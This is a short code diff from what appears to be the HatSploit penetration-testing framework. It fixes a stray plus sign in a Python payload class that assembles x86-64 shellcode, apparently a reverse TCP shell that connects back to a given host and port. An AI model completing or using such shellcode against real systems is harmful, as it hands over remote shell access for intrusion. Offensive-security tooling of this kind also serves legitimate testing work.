@@ -94,7 +94,7 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
             b"\x48\x97"          # xchg   %rax,%rdi
             b"\x48\xb9\x02\x00"  # movabs $0x100007fb3150002,%rcx
             + local_port +       # port
-            + local_host +       # ip
+            local_host +         # ip
             b"\x51"              # push   %rcx
             b"\x48\x89\xe6"      # mov    %rsp,%rsi
             b"\x6a\x10"          # pushq  $0x10
